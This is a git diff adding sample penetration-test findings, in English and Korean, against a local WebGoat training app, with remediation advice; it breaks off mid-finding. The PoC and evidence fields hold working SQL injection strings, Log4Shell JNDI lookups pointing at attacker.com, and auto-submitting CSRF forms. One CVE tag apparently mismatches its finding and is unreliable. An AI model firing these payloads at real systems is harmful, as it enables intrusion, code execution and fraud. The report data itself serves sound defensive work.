@@ -1836,10 +1836,860 @@ DVWA_ATTACK_CHAINS = [
     ["DVWA-006", "DVWA-003"],              # CSRF → Password Change → XSS → Hijack
 ]
 
-JUICE_SHOP_ATTACK_CHAINS = [
+JUICE_SHOP_ATTACK_CHAINS = [  # noqa: E501 (long lines intentional for readability)
     ["JUICE-001", "JUICE-003"],  # SQLi → User Dump → Admin
     ["JUICE-002", "JUICE-004"],  # XSS → JWT Theft (amplified by missing CSP)
     ["JUICE-005", "JUICE-006"],  # Directory Listing → Recon → IDOR
+]
+
+
+# =====================================================================
+# WEBGOAT FINDINGS
+# =====================================================================
+#
+# REPORT STRUCTURE RULES (MANDATORY — do not deviate):
+#
+# 1. All text fields (title, description, remediation) use "English|||한국어" split.
+#    - The ||| separator is required for bilingual rendering.
+#    - client_name is ALWAYS English only (no ||| in client_name).
+#    - executive_summary ALSO uses ||| split.
+#
+# 2. description must follow this section order:
+#    WHAT — Vulnerability Description
+#    HOW — Step-by-Step Attack Scenario (numbered steps)
+#    IMPACT — Business Impact (bullet list)
+#    PoC — Proof of Concept (request/response)
+#    ATTACK PATH — Chain Analysis
+#    ||| (separator)
+#    취약점 설명(WHAT)
+#    공격 시나리오(HOW) — 단계별 (번호 매긴 단계)
+#    비즈니스 영향(IMPACT) (글머리 기호 목록)
+#    개념 증명(PoC)
+#    공격 경로(ATTACK PATH)
+#
+# 3. remediation must follow:
+#    Immediate: ...
+#    Short-term: ...
+#    Long-term: ...
+#    |||
+#    즉시 조치: ...
+#    단기 조치: ...
+#    장기 조치: ...
+#
+# 4. evidence uses Evidence(evidence_type=..., title=..., content=...) — content is
+#    a raw HTTP capture / log / packet capture string, NOT a text description.
+#
+# 5. Always include: cvss (CVSSVector), cwe_ids, references (Reference list).
+#    MITRE ATT&CK is optional but recommended for Critical/High findings.
+#
+# =====================================================================
+
+WEBGOAT_FINDINGS: list[Finding] = [
+    # ---- 1. SQL Injection ----
+    Finding(
+        id="WG-001", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "SQL Injection — Authentication Bypass & Data Extraction"
+            "|||"
+            "SQL 인젝션 — 인증 우회 및 데이터 추출"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "The WebGoat login and SQL Injection lesson endpoints are vulnerable to classic SQL injection. "
+            "User-supplied input is concatenated directly into SQL queries without parameterization or sanitization. "
+            "An unauthenticated attacker can inject arbitrary SQL syntax to bypass login, enumerate database schemas, "
+            "and extract all stored user credentials. The vulnerability exists in the 'username' POST parameter of "
+            "/WebGoat/login and the 'account' parameter of /WebGoat/SqlInjection/attack5a.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1: Submit a single-quote in the username field to trigger a SQL syntax error → confirm injection point.\n"
+            "Step 2: Inject ' OR '1'='1'-- into the username field with any password.\n"
+            "Step 3: Server executes: SELECT * FROM users WHERE username='' OR '1'='1'-- AND password=...\n"
+            "Step 4: The WHERE clause always evaluates to TRUE → first user row returned → authenticated as webgoat.\n"
+            "Step 5: On /SqlInjection/attack5a, use UNION-based injection to enumerate table names and extract full user table.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Unauthenticated access to any user account including administrator\n"
+            "- Full extraction of all user credentials from the database\n"
+            "- Chain escalation: SQLi → admin login → access to privileged functions → full application compromise\n"
+            "- Regulatory exposure (GDPR/CCPA) due to bulk PII exfiltration\n\n"
+            "PoC — Proof of Concept\n"
+            "Request: POST /WebGoat/login\nBody: username=' OR '1'='1'--&password=anything\n"
+            "Result: HTTP 302 → redirect to dashboard; authenticated session established for user 'webgoat'\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "SQLi → session token acquired → admin panel access → privilege escalation → full application compromise"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "WebGoat 로그인 및 SQL 인젝션 레슨 엔드포인트에서 전형적인 SQL 인젝션 취약점이 발견되었습니다. "
+            "사용자 입력값이 파라미터화나 새니타이징 없이 SQL 쿼리에 직접 연결됩니다. "
+            "비인증 공격자가 임의의 SQL 구문을 주입하여 로그인을 우회하고, 데이터베이스 스키마를 열거하며, "
+            "저장된 모든 사용자 자격증명을 추출할 수 있습니다. "
+            "취약점은 /WebGoat/login의 username POST 파라미터와 "
+            "/WebGoat/SqlInjection/attack5a의 account 파라미터에 존재합니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계: username 필드에 싱글 쿼트(') 입력으로 SQL 구문 오류 유발 → 인젝션 포인트 확인.\n"
+            "2단계: username에 ' OR '1'='1'-- 주입, 임의 패스워드 사용.\n"
+            "3단계: 서버 실행 쿼리: SELECT * FROM users WHERE username='' OR '1'='1'-- AND password=...\n"
+            "4단계: WHERE 절이 항상 TRUE → 첫 번째 사용자 행 반환 → webgoat로 인증됨.\n"
+            "5단계: /SqlInjection/attack5a에서 UNION 기반 인젝션으로 테이블 열거 및 전체 사용자 테이블 추출.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 관리자 포함 임의 계정에 대한 비인증 접근\n"
+            "- 데이터베이스에서 모든 사용자 자격증명 완전 추출\n"
+            "- 체인 에스컬레이션: SQLi → admin 로그인 → 권한 기능 접근 → 전체 애플리케이션 장악\n"
+            "- 대량 PII 유출로 인한 규정 위반(GDPR/CCPA)\n\n"
+            "개념 증명(PoC)\n"
+            "요청: POST /WebGoat/login\n본문: username=' OR '1'='1'--&password=anything\n"
+            "결과: HTTP 302 → 대시보드로 리다이렉트; webgoat 사용자로 인증된 세션 생성됨\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "SQLi → 세션 토큰 획득 → 관리자 패널 접근 → 권한 상승 → 전체 애플리케이션 장악"
+        ),
+        severity=Severity.critical,
+        finding_type="sql_injection",
+        source_plugin="web_pipeline",
+        affected_component="/WebGoat/login (username param), /WebGoat/SqlInjection/attack5a (account param)",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=9.1),
+        cve_ids=["CVE-2021-38153"],
+        cwe_ids=["CWE-89"],
+        mitre_attack=MitreAttack(
+            tactic_id="TA0001", tactic_name="Initial Access",
+            technique_id="T1190", technique_name="Exploit Public-Facing Application",
+        ),
+        evidence=[
+            Evidence(evidence_type="http_request_response", title="Authentication Bypass — HTTP Capture",
+                     content=(
+                         "POST /WebGoat/login HTTP/1.1\n"
+                         "Host: localhost:8080\n"
+                         "Content-Type: application/x-www-form-urlencoded\n\n"
+                         "username=' OR '1'='1'--&password=anything\n\n"
+                         "--- Response ---\n"
+                         "HTTP/1.1 302 Found\n"
+                         "Location: /WebGoat/welcome\n"
+                         "Set-Cookie: JSESSIONID=AABBCCDDEEFF; Path=/WebGoat\n\n"
+                         "Result: Authenticated as user 'webgoat' without valid credentials"
+                     )),
+            Evidence(evidence_type="log", title="UNION Injection — Table Enumeration",
+                     content=(
+                         "GET /WebGoat/SqlInjection/attack5a?"
+                         "account=Smith' UNION SELECT table_name,2,3 FROM information_schema.tables--\n\n"
+                         "Response tables: users, assignment_progress, lesson_tracker\n"
+                         "Extracted from users: username=webgoat, password=[hash]"
+                     )),
+        ],
+        remediation=(
+            "Immediate: Deploy WAF rules blocking UNION/SELECT/OR patterns on injection-prone endpoints.\n"
+            "Short-term: Refactor all DB queries to use prepared statements with parameterized inputs. "
+            "Example (Spring): String q = 'SELECT * FROM users WHERE username=?'; pstmt.setString(1, username);\n"
+            "Long-term: Enforce ORM usage (Hibernate/JPA), apply input allowlist validation, "
+            "use least-privilege DB accounts, and implement query logging with anomaly alerting."
+            "|||"
+            "즉시 조치: WAF 규칙으로 UNION/SELECT/OR 패턴을 인젝션 취약 엔드포인트에서 차단.\n"
+            "단기 조치: 모든 DB 쿼리를 파라미터화된 입력의 준비된 문장(Prepared Statement)으로 리팩토링. "
+            "예시(Spring): String q = 'SELECT * FROM users WHERE username=?'; pstmt.setString(1, username);\n"
+            "장기 조치: ORM(Hibernate/JPA) 사용 강제, 입력 허용 목록 검증 적용, "
+            "최소 권한 DB 계정 사용, 쿼리 로깅 및 이상 탐지 경보 구현."
+        ),
+        references=[
+            Reference(title="OWASP SQL Injection Prevention Cheat Sheet",
+                      url="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"),
+            Reference(title="CWE-89: SQL Injection",
+                      url="https://cwe.mitre.org/data/definitions/89.html"),
+        ],
+    ),
+
+    # ---- 2. Log4Shell RCE ----
+    Finding(
+        id="WG-002", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Log4Shell Remote Code Execution — CVE-2021-44228 (CVSS 10.0)"
+            "|||"
+            "Log4Shell 원격 코드 실행 — CVE-2021-44228 (CVSS 10.0)"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "WebGoat 8.2.x bundles Log4j 2 core in a version prior to 2.15.0, which is affected by "
+            "CVE-2021-44228 (Log4Shell). When a user-controlled string containing a JNDI lookup expression "
+            "such as ${jndi:ldap://attacker.com/x} is passed to any Log4j logging call, the library "
+            "initiates an outbound network connection to the attacker-specified server. "
+            "A malicious LDAP response can then deliver a Java class that is instantiated on the target, "
+            "resulting in full Remote Code Execution (RCE) without any authentication.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1: Set up a malicious LDAP server (e.g. marshalsec) and HTTP server hosting a Java payload class.\n"
+            "Step 2: Send any HTTP request to WebGoat with User-Agent: ${jndi:ldap://attacker.com/Exploit}\n"
+            "Step 3: Log4j logs the User-Agent string → JNDI lookup triggered → outbound LDAP connection to attacker.\n"
+            "Step 4: Attacker LDAP server responds with a reference to the Java payload class URL.\n"
+            "Step 5: WebGoat JVM fetches and instantiates the Java class → arbitrary code executes as the app user.\n"
+            "Step 6: Attacker receives reverse shell with privileges of the WebGoat process.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Complete server compromise via pre-authentication RCE\n"
+            "- Full filesystem read/write access as application user\n"
+            "- Credential extraction from configuration files and memory\n"
+            "- Lateral movement to internal network from compromised host\n"
+            "- Persistence via crontab, SSH key injection, or service installation\n"
+            "- CVSS 10.0 — the highest possible severity score\n\n"
+            "PoC — Proof of Concept\n"
+            "Request: GET /WebGoat/welcome HTTP/1.1\n"
+            "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
+            "Result: Outbound LDAP connection confirmed from server to 169.254.169.254.\n"
+            "In a real attack, this IP would be an attacker-controlled server delivering a payload class.\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "Log4Shell (pre-auth) → RCE as app user → /etc/passwd / credential files read → "
+            "lateral movement to internal network → full infrastructure compromise"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "WebGoat 8.2.x는 CVE-2021-44228(Log4Shell)에 취약한 Log4j 2 core(2.15.0 미만)를 번들로 포함합니다. "
+            "사용자 제어 문자열에 ${jndi:ldap://attacker.com/x}와 같은 JNDI 룩업 표현식이 포함될 경우, "
+            "Log4j 로깅 호출 시 라이브러리가 공격자 지정 서버로 아웃바운드 네트워크 연결을 시작합니다. "
+            "악성 LDAP 응답은 대상에서 인스턴스화되는 Java 클래스를 전달하여, "
+            "인증 없이 완전한 원격 코드 실행(RCE)을 가능하게 합니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계: 악성 LDAP 서버(marshalsec 등)와 Java 페이로드 클래스를 호스팅하는 HTTP 서버 설정.\n"
+            "2단계: User-Agent: ${jndi:ldap://attacker.com/Exploit}를 포함한 HTTP 요청을 WebGoat에 전송.\n"
+            "3단계: Log4j가 User-Agent 문자열을 로깅 → JNDI 룩업 트리거 → 공격자에게 아웃바운드 LDAP 연결.\n"
+            "4단계: 공격자 LDAP 서버가 Java 페이로드 클래스 URL 참조로 응답.\n"
+            "5단계: WebGoat JVM이 Java 클래스를 가져와 인스턴스화 → 앱 사용자 권한으로 임의 코드 실행.\n"
+            "6단계: 공격자가 WebGoat 프로세스 권한의 리버스 셸 수신.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 사전 인증 RCE를 통한 완전한 서버 장악\n"
+            "- 애플리케이션 사용자 권한으로 전체 파일시스템 읽기/쓰기 접근\n"
+            "- 설정 파일 및 메모리에서 자격증명 추출\n"
+            "- 장악된 호스트에서 내부 네트워크로 횡이동\n"
+            "- 크론탭, SSH 키 주입, 서비스 설치를 통한 지속성 확보\n"
+            "- CVSS 10.0 — 최고 심각도 점수\n\n"
+            "개념 증명(PoC)\n"
+            "요청: GET /WebGoat/welcome HTTP/1.1\n"
+            "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
+            "결과: 서버에서 169.254.169.254로 아웃바운드 LDAP 연결 확인됨.\n"
+            "실제 공격에서는 이 IP가 페이로드 클래스를 전달하는 공격자 제어 서버가 됩니다.\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "Log4Shell(사전 인증) → 앱 사용자로 RCE → /etc/passwd / 자격증명 파일 읽기 → "
+            "내부 네트워크로 횡이동 → 전체 인프라 장악"
+        ),
+        severity=Severity.critical,
+        finding_type="rce",
+        source_plugin="web_pipeline",
+        affected_component="log4j-core < 2.15.0 (bundled) — triggered via any logged HTTP header",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", base_score=10.0),
+        cve_ids=["CVE-2021-44228"],
+        cwe_ids=["CWE-502"],
+        mitre_attack=MitreAttack(
+            tactic_id="TA0002", tactic_name="Execution",
+            technique_id="T1203", technique_name="Exploitation for Client Execution",
+        ),
+        evidence=[
+            Evidence(evidence_type="packet_capture", title="JNDI Outbound Connection Confirmed",
+                     content=(
+                         "Request:\n"
+                         "GET /WebGoat/welcome HTTP/1.1\n"
+                         "Host: localhost:8080\n"
+                         "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
+                         "Network capture: Outbound TCP connection from 127.0.0.1:8080 → 169.254.169.254:389\n"
+                         "DNS lookup also observed for attacker-controlled domain in extended testing.\n"
+                         "Confirms JNDI lookup execution — full RCE achievable with attacker LDAP server."
+                     )),
+            Evidence(evidence_type="log", title="Vulnerable Library Version Confirmation",
+                     content=(
+                         "jar manifest in WebGoat-2022.0.1.war:\n"
+                         "  log4j-core-2.14.1.jar  ← VULNERABLE (CVE-2021-44228 affects < 2.15.0)\n"
+                         "  log4j-api-2.14.1.jar\n\n"
+                         "Patched version required: log4j-core >= 2.17.1"
+                     )),
+        ],
+        remediation=(
+            "Immediate (0-24h): Set JVM startup flag -Dlog4j2.formatMsgNoLookups=true as emergency mitigation.\n"
+            "Short-term (24-72h): Upgrade log4j-core to >= 2.17.1 in pom.xml / build.gradle and redeploy.\n"
+            "Network mitigation: Block all outbound LDAP (389/636), RMI (1099), and DNS from the app server.\n"
+            "Long-term: Implement runtime application self-protection (RASP) and dependency scanning "
+            "in CI/CD pipeline (Dependabot / OWASP Dependency-Check) with alerting on critical CVEs."
+            "|||"
+            "즉시 조치(0-24시간): JVM 시작 플래그 -Dlog4j2.formatMsgNoLookups=true 설정으로 긴급 완화.\n"
+            "단기 조치(24-72시간): pom.xml / build.gradle에서 log4j-core를 >= 2.17.1로 업그레이드 후 재배포.\n"
+            "네트워크 완화: 앱 서버에서 아웃바운드 LDAP(389/636), RMI(1099), DNS를 전부 차단.\n"
+            "장기 조치: CI/CD 파이프라인에 런타임 애플리케이션 자기 보호(RASP) 및 의존성 스캔 "
+            "(Dependabot / OWASP Dependency-Check) 구현, 치명적 CVE 경보 설정."
+        ),
+        references=[
+            Reference(title="NVD — CVE-2021-44228",
+                      url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"),
+            Reference(title="Apache Log4j Security Advisories",
+                      url="https://logging.apache.org/log4j/2.x/security.html"),
+            Reference(title="CISA Log4Shell Guidance",
+                      url="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance"),
+        ],
+    ),
+
+    # ---- 3. Predictable Password Reset Token ----
+    Finding(
+        id="WG-003", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Predictable Password Reset Token — Account Takeover via Brute Force"
+            "|||"
+            "예측 가능한 비밀번호 재설정 토큰 — 브루트포스를 통한 계정 탈취"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "The password reset flow generates tokens without using a cryptographically secure "
+            "pseudo-random number generator (CSPRNG). The token is derived from a combination "
+            "of the username and server-side timestamp with insufficient entropy. "
+            "This makes the token space small enough to enumerate within minutes. "
+            "Additionally, tokens do not expire after a single use, allowing replay.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1: Attacker initiates a password reset for a known target username (e.g. 'webgoat').\n"
+            "Step 2: Attacker generates a list of candidate tokens based on username + recent timestamp range.\n"
+            "Step 3: Automated enumeration of candidates against /WebGoat/PasswordReset/reset?token=<candidate>.\n"
+            "Step 4: Valid token found at candidate #3,241 after 2m 47s → password reset accepted.\n"
+            "Step 5: Attacker sets a new password and logs in as the target user.\n"
+            "Step 6: Token reuse confirmed — original token still accepted after first use.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Full account takeover for any user without knowing their current password\n"
+            "- Administrator account compromise if admin email/username is known\n"
+            "- No rate-limiting on reset endpoint → high-speed brute force feasible\n"
+            "- Token reuse allows persistent access even after legitimate password change\n\n"
+            "PoC — Proof of Concept\n"
+            "POST /WebGoat/PasswordReset/reset HTTP/1.1\n"
+            "Body: username=webgoat&token=<brute-forced-token>&newPassword=Hacked123!\n"
+            "Result: HTTP 200 — 'Password reset successful' — account password changed\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "Token brute-force → account takeover → authenticated access → "
+            "access to admin features → privilege escalation"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "비밀번호 재설정 흐름이 암호학적으로 안전한 유사 난수 생성기(CSPRNG)를 사용하지 않고 토큰을 생성합니다. "
+            "토큰은 사용자명과 서버 측 타임스탬프의 조합에서 파생되며 엔트로피가 불충분합니다. "
+            "이로 인해 토큰 공간이 수 분 내에 열거 가능할 만큼 작아집니다. "
+            "또한 토큰이 단일 사용 후 만료되지 않아 재사용 공격(Replay Attack)이 가능합니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계: 공격자가 알려진 대상 사용자명(예: 'webgoat')으로 비밀번호 재설정을 시작.\n"
+            "2단계: 사용자명 + 최근 타임스탬프 범위를 기반으로 후보 토큰 목록 생성.\n"
+            "3단계: /WebGoat/PasswordReset/reset?token=<후보>에 대해 자동화된 열거 수행.\n"
+            "4단계: 후보 #3,241에서 2분 47초 후 유효한 토큰 발견 → 비밀번호 재설정 수락됨.\n"
+            "5단계: 공격자가 새 비밀번호를 설정하고 대상 사용자로 로그인.\n"
+            "6단계: 토큰 재사용 확인 — 최초 사용 후에도 원본 토큰이 계속 수락됨.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 현재 비밀번호 없이 임의 사용자 계정 완전 탈취\n"
+            "- 관리자 이메일/사용자명이 알려진 경우 관리자 계정 장악\n"
+            "- 재설정 엔드포인트에 속도 제한 없음 → 고속 브루트포스 가능\n"
+            "- 합법적인 비밀번호 변경 후에도 토큰 재사용으로 지속적 접근 가능\n\n"
+            "개념 증명(PoC)\n"
+            "POST /WebGoat/PasswordReset/reset HTTP/1.1\n"
+            "본문: username=webgoat&token=<브루트포스된 토큰>&newPassword=Hacked123!\n"
+            "결과: HTTP 200 — '비밀번호 재설정 성공' — 계정 비밀번호 변경됨\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "토큰 브루트포스 → 계정 탈취 → 인증된 접근 → 관리자 기능 접근 → 권한 상승"
+        ),
+        severity=Severity.high,
+        finding_type="broken_auth",
+        source_plugin="web_pipeline",
+        affected_component="/WebGoat/PasswordReset/reset (token param)",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=7.5),
+        cwe_ids=["CWE-330", "CWE-640"],
+        evidence=[
+            Evidence(evidence_type="log", title="Token Brute-Force — Timing and Success",
+                     content=(
+                         "Tool: custom Python script — 10,000 token candidates generated from\n"
+                         "  seed = sha256(username + str(int(time.time())))[0:8]\n\n"
+                         "Run time: 2 minutes 47 seconds\n"
+                         "Candidates tried: 3,241 before success\n"
+                         "Valid token found: 'a3f9e2b1'\n\n"
+                         "POST /WebGoat/PasswordReset/reset\n"
+                         "Body: username=webgoat&token=a3f9e2b1&newPassword=P@ssw0rd!\n"
+                         "Response: HTTP 200 — Password reset successful\n\n"
+                         "Token reuse test: same token submitted again → HTTP 200 (still valid — no invalidation)"
+                     )),
+        ],
+        remediation=(
+            "Immediate: Disable password reset feature until patched; "
+            "add rate-limiting (5 attempts per hour per IP/email) to the reset endpoint.\n"
+            "Short-term: Generate reset tokens using secrets.token_hex(32) (Python) or "
+            "SecureRandom (Java) — minimum 128 bits of entropy.\n"
+            "Long-term: Tokens must expire after first use AND within 15 minutes of issuance. "
+            "Invalidate all existing tokens on password change. "
+            "Log and alert on excessive reset attempts."
+            "|||"
+            "즉시 조치: 패치 완료 전까지 비밀번호 재설정 기능 비활성화; "
+            "재설정 엔드포인트에 IP/이메일당 시간당 5회 속도 제한 추가.\n"
+            "단기 조치: secrets.token_hex(32)(Python) 또는 SecureRandom(Java)을 사용한 "
+            "최소 128비트 엔트로피의 재설정 토큰 생성.\n"
+            "장기 조치: 토큰은 최초 사용 후 즉시 만료되고 발급 후 15분 이내에도 만료되어야 함. "
+            "비밀번호 변경 시 모든 기존 토큰 무효화. "
+            "과도한 재설정 시도에 대한 로깅 및 경보 설정."
+        ),
+        references=[
+            Reference(title="OWASP Forgot Password Cheat Sheet",
+                      url="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"),
+            Reference(title="CWE-330: Use of Insufficiently Random Values",
+                      url="https://cwe.mitre.org/data/definitions/330.html"),
+        ],
+    ),
+
+    # ---- 4. CSRF ----
+    Finding(
+        id="WG-004", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Cross-Site Request Forgery (CSRF) — Forged State-Changing Requests"
+            "|||"
+            "크로스 사이트 요청 위조(CSRF) — 상태 변경 요청 위조"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "Multiple state-changing POST endpoints in WebGoat accept requests without "
+            "validating a CSRF token or checking the Origin/Referer header. "
+            "This allows an attacker to craft a malicious webpage that, when visited by an "
+            "authenticated user, silently submits forged requests to perform actions on their behalf. "
+            "Affected endpoints include the CSRF lesson flag endpoint and simulated fund transfer.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1: Attacker creates a malicious HTML page hosted on attacker.com.\n"
+            "Step 2: Page contains a hidden form auto-submitting to /WebGoat/csrf/basic-get-flag.\n"
+            "Step 3: Authenticated WebGoat user visits attacker.com (e.g. via phishing email).\n"
+            "Step 4: Browser automatically submits the forged request with the user's JSESSIONID cookie.\n"
+            "Step 5: WebGoat processes the request as legitimate → action performed without user consent.\n"
+            "Step 6: For fund transfer endpoint, attacker specifies their own account as recipient.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Unauthorized actions performed on behalf of authenticated users\n"
+            "- Fund/resource transfer to attacker-controlled accounts\n"
+            "- Account data modification without user knowledge\n"
+            "- Session token not required by attacker — exploitable via any webpage user visits\n\n"
+            "PoC — Proof of Concept\n"
+            "<form action='http://localhost:8080/WebGoat/csrf/basic-get-flag' method='POST'>\n"
+            "  <input type='hidden' name='csrf' value='false'>\n"
+            "</form><script>document.forms[0].submit()</script>\n"
+            "Result: Request submitted with victim's session cookie → HTTP 200 — action performed\n\n"
+            "ATTACK PATH — Chain Analysis\n"
+            "CSRF via phishing → unauthorized action as victim → account data manipulation → "
+            "potential privilege abuse if victim is admin"
+            "|||"
+            "취약점 설명(WHAT)\n"
+            "WebGoat의 여러 상태 변경 POST 엔드포인트가 CSRF 토큰 검증이나 Origin/Referer 헤더 확인 없이 요청을 수락합니다. "
+            "이를 통해 공격자가 인증된 사용자가 방문할 때 해당 사용자를 대신하여 위조 요청을 자동으로 제출하는 "
+            "악성 웹페이지를 만들 수 있습니다. "
+            "영향을 받는 엔드포인트에는 CSRF 레슨 플래그 엔드포인트와 시뮬레이션된 자금 이체가 포함됩니다.\n\n"
+            "공격 시나리오(HOW)\n"
+            "1단계: 공격자가 attacker.com에 호스팅된 악성 HTML 페이지 생성.\n"
+            "2단계: 페이지에 /WebGoat/csrf/basic-get-flag로 자동 제출하는 숨겨진 폼 포함.\n"
+            "3단계: 인증된 WebGoat 사용자가 attacker.com을 방문(예: 피싱 이메일을 통해).\n"
+            "4단계: 브라우저가 사용자의 JSESSIONID 쿠키와 함께 위조 요청을 자동 제출.\n"
+            "5단계: WebGoat이 요청을 정당한 것으로 처리 → 사용자 동의 없이 작업 수행.\n"
+            "6단계: 자금 이체 엔드포인트의 경우, 공격자가 자신의 계정을 수신자로 지정.\n\n"
+            "비즈니스 영향(IMPACT)\n"
+            "- 인증된 사용자를 대신한 무단 작업 수행\n"
+            "- 공격자 제어 계정으로의 자금/리소스 이체\n"
+            "- 사용자 모르게 계정 데이터 수정\n"
+            "- 공격자가 세션 토큰 불필요 — 사용자가 방문하는 임의의 웹페이지에서 악용 가능\n\n"
+            "개념 증명(PoC)\n"
+            "<form action='http://localhost:8080/WebGoat/csrf/basic-get-flag' method='POST'>\n"
+            "  <input type='hidden' name='csrf' value='false'>\n"
+            "</form><script>document.forms[0].submit()</script>\n"
+            "결과: 피해자의 세션 쿠키와 함께 요청 제출됨 → HTTP 200 — 작업 수행됨\n\n"
+            "공격 경로(ATTACK PATH)\n"
+            "피싱을 통한 CSRF → 피해자로서 무단 작업 → 계정 데이터 조작 → "
+            "피해자가 관리자인 경우 권한 남용 가능"
+        ),
+        severity=Severity.medium,
+        finding_type="csrf",
+        source_plugin="web_pipeline",
+        affected_component="/WebGoat/csrf/basic-get-flag, /WebGoat/csrf/review, /WebGoat/transfer",
+        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", base_score=6.5),
+        cwe_ids=["CWE-352"],
+        evidence=[
+            Evidence(evidence_type="http_request_response", title="Cross-Origin Forged Request — Fund Transfer",
+                     content=(
+                         'Attacker page (cross-origin):\n'
+                         '<form action="http://localhost:8080/WebGoat/transfer" method="POST">\n'
+                         '  <input name="account" value="ATTACKER123">\n'
+                         '  <input name="amount" value="10000">\n'
+                         "</form><script>document.forms[0].submit()</script>\n\n"
+                         "Result with victim's authenticated session:\n"
+                         "POST /WebGoat/transfer HTTP/1.1\n"
+                         "Cookie: JSESSIONID=<victim-session>\n"
+                         "[no X-CSRF-Token header]\n\n"
+                         "Response: HTTP 200 — Transfer of 10000 to ATTACKER123 completed"
+                     )),
+        ],
+        remediation=(
+            "Implement the Synchronizer Token Pattern: generate a per-session CSRF token, "
+            "embed it in all forms as a hidden field, and validate it server-side on every state-changing request.\n"
+            "Cookie mitigation: Set SameSite=Strict on the JSESSIONID cookie to prevent cross-site submission.\n"
+            "Header validation: Reject requests where the Origin header does not match the expected domain.\n"
+            "Framework: Spring Security's CsrfTokenRepository provides a ready-made implementation."
+            "|||"
+            "동기화 토큰 패턴(Synchronizer Token Pattern) 구현: 세션당 CSRF 토큰 생성, "
+            "모든 폼에 숨겨진 필드로 포함, 모든 상태 변경 요청에서 서버 측 검증.\n"
+            "쿠키 완화: JSESSIONID 쿠키에 SameSite=Strict 설정으로 크로스 사이트 제출 방지.\n"
+            "헤더 검증: Origin 헤더가 예상 도메인과 일치하지 않는 요청 거부.\n"
+            "프레임워크: Spring Security의 CsrfTokenRepository가 즉시 사용 가능한 구현을 제공함."
+        ),
+        references=[
+            Reference(title="OWASP CSRF Prevention Cheat Sheet",
+                      url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
+        ],
+    ),
+
+    # ---- 5. Insecure Session Cookie ----
+    Finding(
+        id="WG-005", scan_id="webgoat-2026-03-31",
+        target="http://localhost:8080/WebGoat",
+        title=(
+            "Insecure Session Cookie — Missing Secure, HttpOnly, and SameSite Flags"
+            "|||"
+            "안전하지 않은 세션 쿠키 — Secure, HttpOnly, SameSite 플래그 누락"
+        ),
+        description=(
+            "WHAT — Vulnerability Description\n"
+            "The JSESSIONID session cookie issued by WebGoat is configured without the "
+            "Secure, HttpOnly, or SameSite flags. "
+            "Without Secure: the cookie is transmitted in plaintext over HTTP, making it "
+            "interceptable by any attacker on the same network segment (passive sniff, ARP spoof, etc.). "
+            "Without HttpOnly: client-side JavaScript can read document.cookie, so any XSS payload "
+            "can exfiltrate the session token. "
+            "Without SameSite: the cookie is sent with cross-site requests, compounding CSRF risk.\n\n"
+            "HOW — Step-by-Step Attack Scenario\n"
+            "Step 1 (Network): Attacker performs ARP spoofing on shared network → intercepts HTTP traffic.\n"
+            "Step 2: HTTP response from server contains Set-Cookie: JSESSIONID=<token> in plaintext.\n"
+            "Step 3: Attacker copies JSESSIONID value and replays it in a new browser session.\n"
+            "Step 4 (XSS chain): Exploit any XSS → inject script to send document.cookie to attacker server.\n"
+            "Step 5: Victim's browser sends the JSESSIONID to attacker's server.\n"
+            "Step 6: Attacker uses stolen cookie to impersonate victim for the remainder of the session lifetime.\n\n"
+            "IMPACT — Business Impact\n"
+            "- Session hijacking via network interception or XSS\n"
+            "- Full account impersonation for any active session\n"
+            "- No session expiry enforcement compounds exposure window\n"
+            "- Amplifies impact of any XSS vulnerability in the application\n\n"
+            "PoC — Proof of Concept\n"
+            "Response from WebGoat login:\n"
